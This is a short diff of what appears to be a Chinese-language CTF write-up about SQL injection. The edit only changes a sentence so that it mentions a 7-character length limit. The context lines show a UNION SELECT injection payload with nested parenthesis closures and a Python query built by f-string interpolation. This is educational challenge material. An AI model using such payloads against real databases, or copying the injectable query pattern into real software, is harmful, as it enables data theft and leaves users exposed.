@@ -355,7 +355,7 @@ code = '))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+
 	"name":"'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+"
 }
 ```
-但是这里`name`中又不能出现`'`、`(`，这我们要怎么构造闭合呢。
+但是这里`name`中又不能出现`'`、`(`，并且长度不超过`7`这我们要怎么构造闭合呢。
 这里学一个新的手法:
 ```python
 cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
